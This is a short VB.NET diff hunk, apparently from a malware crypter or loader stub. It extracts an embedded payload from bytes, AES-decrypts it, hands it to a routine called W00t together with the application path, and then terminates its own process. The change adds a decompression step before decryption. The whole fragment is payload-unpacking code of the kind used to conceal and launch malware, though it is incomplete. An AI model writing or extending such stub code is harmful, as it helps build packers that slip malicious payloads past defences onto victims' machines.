@@ -6,7 +6,7 @@
         Dim NewByts() As Byte = RedimPload(Payload, Start)
         NewByts = Loop1(NewByts, Payload, Start)
         NewByts = Loop2(NewByts)
-        W00t(AES_Decrypt(NewByts), AppPath)
+        W00t(AES_Decrypt(Decompress(NewByts)), AppPath)
         Process.GetCurrentProcess.Kill()
     End Sub
     Public Shared Function Decompress(bytes As Byte()) As Byte()
